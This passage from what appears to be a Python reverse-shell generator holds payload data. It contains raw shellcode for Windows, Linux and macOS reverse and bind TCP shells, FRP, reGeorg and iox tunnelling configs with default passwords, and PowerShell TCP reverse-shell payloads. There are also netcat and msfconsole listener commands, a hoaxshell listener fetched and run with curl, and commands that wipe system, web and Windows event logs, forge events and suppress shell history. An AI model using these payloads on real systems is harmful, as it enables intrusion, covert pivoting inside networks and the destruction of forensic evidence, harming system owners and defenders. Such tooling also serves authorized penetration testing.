x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\xc2\\xdb\\x37\\x67\\xff\\xd5\\x48\\x31\\xd2\\x48\\x89\\xf9\\x41\\xba\\xb7\\xe9\\x38\\xff\\xff\\xd5\\x4d\\x31\\xc0\\x48\\x31\\xd2\\x48\\x89\\xf9\\x41\\xba\\x74\\xec\\x3b\\xe1\\xff\\xd5\\x48\\x89\\xf9\\x48\\x89\\xc7\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x48\\x81\\xc4\\xa0\\x02\\x00\\x00\\x49\\xb8\\x63\\x6d\\x64\\x00\\x00\\x00\\x00\\x00\\x41\\x50\\x41\\x50\\x48\\x89\\xe2\\x57\\x57\\x57\\x4d\\x31\\xc0\\x6a\\x0d\\x59\\x41\\x50\\xe2\\xfc\\x66\\xc7\\x44\\x24\\x54\\x01\\x01\\x48\\x8d\\x44\\x24\\x18\\xc6\\x00\\x68\\x48\\x89\\xe6\\x56\\x50\\x41\\x50\\x41\\x50\\x41\\x50\\x49\\xff\\xc0\\x41\\x50\\x49\\xff\\xc8\\x4d\\x89\\xc1\\x4c\\x89\\xc1\\x41\\xba\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x48\\x31\\xd2\\x48\\xff\\xca\\x8b\\x0e\\x41\\xba\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5",
        "meta": ["windows"]
    },
    {
        "name": "Windows - Bind TCP (x64, staged)",
        "command": "\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x56\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x8b\\x72\\x50\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\x8b\\x48\\x18\\x50\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\x41\\xc1\\xc9\\x0d\\xac\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x41\\x58\\x48\\x01\\xd0\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5\\x48\\x31\\xc0\\x50\\x50\\x49\\xc7\\xc4\\x02\\x00{port}\\x41\\x54\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x02\\x59\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\xc2\\xdb\\x37\\x67\\xff\\xd5\\x48\\x31\\xd2\\x48\\x89\\xf9\\x41\\xba\\xb7\\xe9\\x38\\xff\\xff\\xd5\\x4d\\x31\\xc0\\x48\\x31\\xd2\\x48\\x89\\xf9\\x41\\xba\\x74\\xec\\x3b\\xe1\\xff\\xd5\\x48\\x89\\xf9\\x48\\x89\\xc7\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x48\\x81\\xc4\\xb0\\x02\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xe1\\x41\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5",
        "meta": ["windows"]
    },
    {
        "name": "Linux - Reverse TCP (x86)",
        "command": "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68{ip}\\x68\\x02\\x00{port}\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
        "meta": ["linux"]
    },
    {
        "name": "Linux - Reverse TCP (x86, staged)",
        "command": "\\x6a\\x0a\\x5e\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\xb0\\x66\\x89\\xe1\\xcd\\x80\\x97\\x5b\\x68{ip}\\x68\\x02\\x00{port}\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x57\\x89\\xe1\\x43\\xcd\\x80\\x85\\xc0\\x79\\x19\\x4e\\x74\\x3d\\x68\\xa2\\x00\\x00\\x00\\x58\\x6a\\x00\\x6a\\x05\\x89\\xe3\\x31\\xc9\\xcd\\x80\\x85\\xc0\\x79\\xbd\\xeb\\x27\\xb2\\x07\\xb9\\x00\\x10\\x00\\x00\\x89\\xe3\\xc1\\xeb\\x0c\\xc1\\xe3\\x0c\\xb0\\x7d\\xcd\\x80\\x85\\xc0\\x78\\x10\\x5b\\x89\\xe1\\x99\\xb2\\x24\\xb0\\x03\\xcd\\x80\\x85\\xc0\\x78\\x02\\xff\\xe1\\xb8\\x01\\x00\\x00\\x00\\xbb\\x01\\x00\\x00\\x00\\xcd\\x80",
        "meta": ["linux"]
    },
    {
        "name": "Linux - Bind TCP (x86)",
        "command": "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e\\x52\\x68\\x02\\x00{port}\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x89\\x41\\x04\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
        "meta": ["linux"]
    },
    {
        "name": "Linux - Bind TCP (x86, staged)",
        "command": "\\x6a\\x7d\\x58\\x99\\xb2\\x07\\xb9\\x00\\x10\\x00\\x00\\x89\\xe3\\x66\\x81\\xe3\\x00\\xf0\\xcd\\x80\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x51\\x6a\\x04\\x54\\x6a\\x02\\x6a\\x01\\x50\\x97\\x89\\xe1\\x6a\\x0e\\x5b\\x6a\\x66\\x58\\xcd\\x80\\x89\\xf8\\x83\\xc4\\x14\\x59\\x5b\\x5e\\x52\\x68\\x02\\x00{port}\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\xd1\\xe3\\xb0\\x66\\xcd\\x80\\x57\\x43\\xb0\\x66\\x89\\x51\\x04\\xcd\\x80\\x93\\xb6\\x0c\\xb0\\x03\\xcd\\x80\\x87\\xdf\\x5b\\xb0\\x06\\xcd\\x80\\xff\\xe1",
        "meta": ["linux"]
    },
    {
        "name": "Linux - Reverse TCP (x64)",
        "command": "\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48\\xb9\\x02\\x00{port}{ip}\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05",
        "meta": ["linux"]
    },
    {
        "name": "Linux - Reverse TCP (x64, staged)",
        "command": "\\x31\\xff\\x6a\\x09\\x58\\x99\\xb6\\x10\\x48\\x89\\xd6\\x4d\\x31\\xc9\\x6a\\x22\\x41\\x5a\\x6a\\x07\\x5a\\x0f\\x05\\x48\\x85\\xc0\\x78\\x51\\x6a\\x0a\\x41\\x59\\x50\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x85\\xc0\\x78\\x3b\\x48\\x97\\x48\\xb9\\x02\\x00{port}{ip}\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x59\\x48\\x85\\xc0\\x79\\x25\\x49\\xff\\xc9\\x74\\x18\\x57\\x6a\\x23\\x58\\x6a\\x00\\x6a\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x0f\\x05\\x59\\x59\\x5f\\x48\\x85\\xc0\\x79\\xc7\\x6a\\x3c\\x58\\x6a\\x01\\x5f\\x0f\\x05\\x5e\\x6a\\x26\\x5a\\x0f\\x05\\x48\\x85\\xc0\\x78\\xed\\xff\\xe6",
        "meta": ["linux"]
    },
    {
        "name": "Linux - Bind TCP (x64)",
        "command": "\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x52\\xc7\\x04\\x24\\x02\\x00{port}\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x31\\x58\\x0f\\x05\\x6a\\x32\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05",
        "meta": ["linux"]
    },
    {
        "name": "Linux - Bind TCP (x64, staged)",
        "command": "\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x52\\xc7\\x04\\x24\\x02\\x00{port}\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x31\\x58\\x0f\\x05\\x59\\x6a\\x32\\x58\\x0f\\x05\\x48\\x96\\x6a\\x2b\\x58\\x0f\\x05\\x50\\x56\\x5f\\x6a\\x09\\x58\\x99\\xb6\\x10\\x48\\x89\\xd6\\x4d\\x31\\xc9\\x6a\\x22\\x41\\x5a\\xb2\\x07\\x0f\\x05\\x48\\x96\\x48\\x97\\x5f\\x0f\\x05\\xff\\xe6",
        "meta": ["linux"]
    },
    {
        "name": "MacOS - Reverse TCP (x86)",
        "command": "\\x68{ip}\\x68\\xff\\x02{port}\\x89\\xe7\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x6a\\x10\\xb0\\x61\\xcd\\x80\\x57\\x50\\x50\\x6a\\x62\\x58\\xcd\\x80\\x50\\x6a\\x5a\\x58\\xcd\\x80\\xff\\x4f\\xe8\\x79\\xf6\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\\x54\\x53\\x50\\xb0\\x3b\\xcd\\x80",
        "meta": ["mac"]
    },
    {
        "name": "MacOS - Bind TCP (x86)",
        "command": "\\x31\\xc0\\x50\\x68\\xff\\x02{port}\\x89\\xe7\\x50\\x6a\\x01\\x6a\\x02\\x6a\\x10\\xb0\\x61\\xcd\\x80\\x57\\x50\\x50\\x6a\\x68\\x58\\xcd\\x80\\x89\\x47\\xec\\xb0\\x6a\\xcd\\x80\\xb0\\x1e\\xcd\\x80\\x50\\x50\\x6a\\x5a\\x58\\xcd\\x80\\xff\\x4f\\xe4\\x79\\xf6\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\\x54\\x53\\x50\\xb0\\x3b\\xcd\\x80",
        "meta": ["mac"]
    },
    {
        "name": "MacOS - Reverse TCP (x64)",
        "command": "\\xb8\\x61\\x00\\x00\\x02\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x48\\x31\\xd2\\x0f\\x05\\x49\\x89\\xc4\\x48\\x89\\xc7\\xb8\\x62\\x00\\x00\\x02\\x48\\x31\\xf6\\x56\\x48\\xbe\\x02\\x00{port}{ip}\\x56\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x0f\\x05\\x4c\\x89\\xe7\\xb8\\x5a\\x00\\x00\\x02\\x48\\xc7\\xc6\\x02\\x00\\x00\\x00\\x0f\\x05\\xb8\\x5a\\x00\\x00\\x02\\x48\\xc7\\xc6\\x01\\x00\\x00\\x00\\x0f\\x05\\xb8\\x5a\\x00\\x00\\x02\\x48\\xc7\\xc6\\x00\\x00\\x00\\x00\\x0f\\x05\\x48\\x31\\xc0\\xb8\\x3b\\x00\\x00\\x02\\xe8\\x09\\x00\\x00\\x00\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x00\\x5f\\x48\\x31\\xd2\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05",
        "meta": ["mac"]
    },
    {
        "name": "MacOS - Bind TCP (x64)",
        "command": "\\xb8\\x61\\x00\\x00\\x02\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x48\\x31\\xd2\\x0f\\x05\\x48\\x89\\xc7\\xb8\\x68\\x00\\x00\\x02\\x48\\x31\\xf6\\x56\\xbe\\x00\\x02{port}\\x56\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x0f\\x05\\xb8\\x6a\\x00\\x00\\x02\\x48\\x31\\xf6\\x48\\xff\\xc6\\x49\\x89\\xfc\\x0f\\x05\\xb8\\x1e\\x00\\x00\\x02\\x4c\\x89\\xe7\\x48\\x89\\xe6\\x48\\x89\\xe2\\x48\\x83\\xea\\x04\\x0f\\x05\\x48\\x89\\xc7\\xb8\\x5a\\x00\\x00\\x02\\x48\\x31\\xf6\\x0f\\x05\\xb8\\x5a\\x00\\x00\\x02\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\xb8\\x3b\\x00\\x00\\x02\\xe8\\x08\\x00\\x00\\x00\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x48\\x8b\\x3c\\x24\\x48\\x31\\xd2\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05",
        "meta": ["mac"]
    },
])


# ============================================================================
# 内网代理命令 (11 条)
# ============================================================================

PROXY_COMMANDS = _tag(CommandType.Proxy, [
    {
        "name": "FRP 服务端",
        "command": "[common]\nbind_addr = 0.0.0.0\nbind_port = {port}\ndashboard_addr = 0.0.0.0\ndashboard_port = 37261\ndashboard_user = admin\ndashboard_pwd = admin\ntoken = 123456\nheartbeat_timeout = 60\nmax_pool_count = 10",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "FRP 客户端 (Linux/Mac)",
        "command": "[common]\nserver_addr = {ip}\nserver_port = {port}\ntoken = 123456\npool_count = 10\nprotocol = tcp\ntls_enable = true\n\n[目标名称]\ntype = tcp\nremote_port = 30000\nplugin = socks5\nplugin_user = admin\nplugin_passwd = admin\nuse_encryption = true\nuse_compression = true",
        "meta": ["linux", "mac"]
    },
    {
        "name": "FRP 客户端 (Windows)",
        "command": "[common]\nserver_addr = {ip}\nserver_port = {port}\ntoken = 123456\npool_count = 10\nprotocol = tcp\ntls_enable = false\n\n[目标名称]\ntype = tcp\nremote_port = 30000\nplugin = socks5\nplugin_user = admin\nplugin_passwd = admin\nuse_encryption = true\nuse_compression = true",
        "meta": ["windows"]
    },
    {
        "name": "NeoreGeorg",
        "command": "python3 neoreg.py generate -k 123456\n\npython3 neoreg.py -k 123456 -u https://{ip}/tunnel.php",
        "meta": ["windows"]
    },
    {
        "name": "reGeorg",
        "command": "python reGeorgSocksProxy.py -p {port} -u http://{ip}/tunnel.php",
        "meta": ["windows"]
    },
    {
        "name": "iox 开启 SOCKS5 代理",
        "command": "iox proxy -l {port}",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "iox 将 SOCKS 转发至 VPS",
        "command": "# 边界主机:\niox proxy -r {ip}:{port}\n\n# VPS:\niox proxy -l {port} -l 1080",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "iox 本地端口转发",
        "command": "iox fwd -l {port} -l 9999",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "iox 内网端口转发至 VPS",
        "command": "# 内网端口转到 VPS 指定端口:\niox fwd -l 3389 -r {ip}:{port}\n\n# VPS 端口转发:\niox fwd -l {port} -l 9999",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "iox 远程服务器间端口转发",
        "command": "iox fwd -r 内网服务器IP:3389 -r {ip}:{port}",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "Kali 配置代理 (proxychains)",
        "command": "vi /etc/proxychains.conf\n\n[ProxyList]\nsocks5 {ip} {port}\n\nESC :wq 回车\n\nproxychains 命令/工具",
        "meta": ["linux", "windows", "mac"]
    },
])


# ============================================================================
# 痕迹清理命令 (17 条)
# ============================================================================

CLEANUP_COMMANDS = _tag(CommandType.Cleanup, [
    {
        "name": "Linux 本次不记录命令 (完全不记录)",
        "command": "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0",
        "meta": ["linux"]
    },
    {
        "name": "Linux 常用日志全清",
        "command": "echo > /var/log/btmp;echo > /var/log/wtmp;echo > /var/log/lastlog;echo > /var/log/utmp;cat /dev/null > /var/log/secure;cat /dev/null > /var/log/message;echo ok",
        "meta": ["linux"]
    },
    {
        "name": "Linux 清除 Web 日志",
        "command": "# 直接替换日志 IP 地址:\nsed -i 's/{ip}/192.168.1.1/g' access.log\n\n# 清除部分相关日志 (使用 grep -v 删除相关信息):\ncat /var/log/nginx/access.log | grep -v evil.php > tmp.log\n\n# 把修改过的日志覆盖到原日志文件:\ncat tmp.log > /var/log/nginx/access.log/",
        "meta": ["linux"]
    },
    {
        "name": "隐身登录系统",
        "command": "ssh -T root@{ip} /bin/bash -i",
        "meta": ["linux"]
    },
    {
        "name": "不记录 SSH 公钥",
        "command": "ssh -o UserKnownHostsFile=/dev/null -T root@{ip} /bin/bash -i",
        "meta": ["linux"]
    },
    {
        "name": "Windows MSF 一键清理",
        "command": "meterpreter> run event_manager -c",
        "meta": ["windows"]
    },
    {
        "name": "Windows 事件日志全清",
        "command": "PowerShell -Command \"& {Clear-Eventlog -Log Application,System,Security}\" & Powershell -Command \"Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname}\"",
        "meta": ["windows"]
    },
    {
        "name": "Windows IIS 日志全清",
        "command": "# 1. 停止服务:\nnet stop w3svc\n\n# 2. 删除日志目录下所有文件:\ndel *.*\n\n# 3. 重新启用服务:\nnet start w3svc\n\n# IIS 日志存放地址:\n# Windows Server 2003 IIS 6 日志路径:\n# C:\\Windows\\System32\\LogFiles\n# Windows Server 2008 R2、2012、2016、2019 IIS7 以上日志路径:\n# C:\\inetpub\\logs\\LogFiles\n\n# 每个网站 IIS 会自动生成一个保存日志的文件夹,\n# 具体 IIS 日志位置在 LogFiles 文件夹中的子文件夹里, 例如:\n# C:\\Windows\\System32\\LogFiles\\W3SVC2\n# C:\\inetpub\\logs\\LogFiles\\W3SVC1",
        "meta": ["windows"]
    },
    {
        "name": "Windows 远程桌面记录全清",
        "command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f & reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f & reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" & del /ah %homepath%\\documents\\default.rdp",
        "meta": ["windows"]
    },
    {
        "name": "Linux 文件安全删除",
        "command": "# shred 命令擦除数据, 默认覆盖 3 次, 通过 -n 指定数据覆盖次数:\nshred -f -u -z -v -n 8 <要删除的文件>\n\n# dd 命令:\ndd if=/dev/zero of=<要删除的文件> bs=<大小> count=<写入的次数>\n\n# wipe 命令:\nwipe <要删除的文件>",
        "meta": ["linux"]
    },
    {
        "name": "Windows 文件安全删除",
        "command": "# 1. Cipher 命令多次覆写:\ncipher /w:D:\\文件名\n\n# 2. Format 命令覆盖格式化:\nformat D: /P:8\n\n# Tips:\n# Cipher 命令通过 /W 参数可反复写入其他数据覆盖已删除文件的硬盘空间,\n# 彻底删除数据防止被恢复.\n# Format 命令加上 /P 参数后, 会把每个扇区先清零, 再用随机数覆盖.\n# 而且可以覆盖多次, 上述命令表示把 D 盘用随机数覆盖 8 次.",
        "meta": ["windows"]
    },
    {
        "name": "Linux 清除 history 记录文件",
        "command": "vim ~/.bash_history\n# 删除不想要的部分, dd 删除一整行\n# Esc, 输入 :wq, 回车",
        "meta": ["linux"]
    },
    {
        "name": "Linux 清除当前用户的 history 命令记录",
        "command": "history -c",
        "meta": ["linux"]
    },
    {
        "name": "Linux 本次不记录命令 (记录第一行)",
        "command": "set +o history",
        "meta": ["linux"]
    },
    {
        "name": "Linux 清空特定日志文件",
        "command": "# 1. 清除登录系统失败的记录:\necho > /var/log/btmp\n\n# 2. 清除登录系统成功的记录:\necho > /var/log/wtmp\n\n# 3. 清除用户最后一次登录时间:\necho > /var/log/lastlog\n\n# 4. 清除当前登录用户的信息:\necho > /var/log/utmp\n\n# 5. 清除安全日志记录:\ncat /dev/null > /var/log/secure\n\n# 6. 清除系统日志记录:\ncat /dev/null > /var/log/message",
        "meta": ["linux"]
    },
    {
        "name": "Linux 删除/替换特定日志信息",
        "command": "# 删除所有匹配到字符串的行, 比如以当天日期或者自己的登录 IP:\nsed -i '/{ip}/'d /var/log/messages\n\n# 全局替换登录 IP 地址:\nsed -i 's/{ip}/192.168.1.1/g' secure",
        "meta": ["linux"]
    },
    {
        "name": "Windows 删除/替换特定日志信息",
        "command": "# 1. 利用脚本停止日志的记录:\n# https://github.com/hlldz/Invoke-Phant0m\n\n# 2. Windows 单条日志清除:\n# https://github.com/QAX-A-Team/EventCleaner\n\n# 3. Windows 日志伪造:\neventcreate -l system -so administrator -t warning -d \"this is a test\" -id 500",
        "meta": ["windows"]
    },
])


# ============================================================================
# 合并命令列表
# ============================================================================

ALL_COMMANDS: List[dict] = (
    REVERSE_SHELL_COMMANDS
    + BIND_SHELL_COMMANDS
    + MSFVENOM_COMMANDS
    + HOAXSHELL_COMMANDS
    + ASSEMBLED_COMMANDS
    + PROXY_COMMANDS
    + CLEANUP_COMMANDS
)


# ============================================================================
# 监听器命令 (16 条)
# ============================================================================

LISTENER_COMMANDS: List[Tuple[str, str]] = [
    ("nc", "nc -lvnp {port}"),
    ("nc freebsd", "nc -lvn {port}"),
    ("busybox nc", "busybox nc -lp {port}"),
    ("ncat", "ncat -lvnp {port}"),
    ("ncat.exe", "ncat.exe -lvnp {port}"),
    ("ncat (TLS)", "ncat --ssl -lvnp {port}"),
    ("rlwrap + nc", "rlwrap -cAr nc -lvnp {port}"),
    ("rustcat", "rcat listen {port}"),
    ("openssl", "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {port}"),
    ("pwncat", "python3 -m pwncat -lp {port}"),
    ("pwncat (windows)", "python3 -m pwncat -m windows -lp {port}"),
    ("windows ConPty", "stty raw -echo; (stty size; cat) | nc -lvnp {port}"),
    ("socat", "socat -d -d TCP-LISTEN:{port} STDOUT"),
    ("socat (TTY)", "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}"),
    ("powercat", "powercat -l -p {port}"),
    ("msfconsole", 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'),
    ("hoaxshell", 'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {port}'),
]


# ============================================================================
# Shell 选项 (16 种)
# ============================================================================

SHELLS: List[str] = [
    "sh", "/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh",
    "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "dash",
]


# ============================================================================
# PowerShell Base64 特殊 Payload
# ============================================================================

SPECIAL_COMMANDS: Dict[str, str] = {
    "PowerShell payload": (
        '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});'
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()};"
        "$client.Close()"
    ),
    "PowerShell +stderr payload": (
        '$ErrorView="NormalView";$ErrorActionPreference="Continue";'
        '$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});'
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length))-ne0){"
        "$d=([text.encoding]::ASCII).GetString($b,0,$i);"
        "try{$o=iex $d 2>&1 3>&1 4>&1 5>&1 6>&1|Out-String}"
        "catch{$o=$_|Out-String}"
        'if([string]::IsNullOrEmpty($o)){$o=""}'
        '$p="PS "+(pwd).Path+"> ";'
        "[byte[]]$sb=([text.encoding]::ASCII).GetBytes($o+$p);"
        "$s.Write($sb,0,$sb.Length);"
        "$s.Flush()};"
        "$c.Close()"
    ),
}


# ============================================================================
# HoaxShell 监听器类型映射
# ============================================================================

HOAXSHELL_LISTENER_TYPES: Dict[str, str] = {
    "Windows CMD cURL": "cmd-curl",
    "PowerShell IEX": "ps-iex",
    "PowerShell IEX Constr Lang Mode": "ps-iex-cm",
    "PowerShell Outfile": "ps-outfile",
    "PowerShell Outfile Constr Lang Mode": "ps-outfile-cm",
    "Windows CMD cURL https": "cmd-curl -c /your/cert.pem -k /your/key.pem",
    "PowerShell IEX https": "ps-iex -c /your/cert.pem -k /your/key.pem",
    "PowerShell IEX Constr Lang Mode https": "ps-iex-cm -c /your/cert.pem -k /your/key.pem",
    "PowerShell Outfile https": "ps-outfile -c /your/cert.pem -k /your/key.pem",
    "PowerShell Outfile Constr Lang Mode https": "ps-outfile-cm -c /your/cert.pem -k /your/key.pem",
}


# ============================================================================
# UDP Payload 名称列表（用于监听器自动检测）
# ============================================================================

UDP_PAYLOADS: List[str] = [
    "Bash udp",
    "Bash 196 UDP",
    "ncat udp",
]
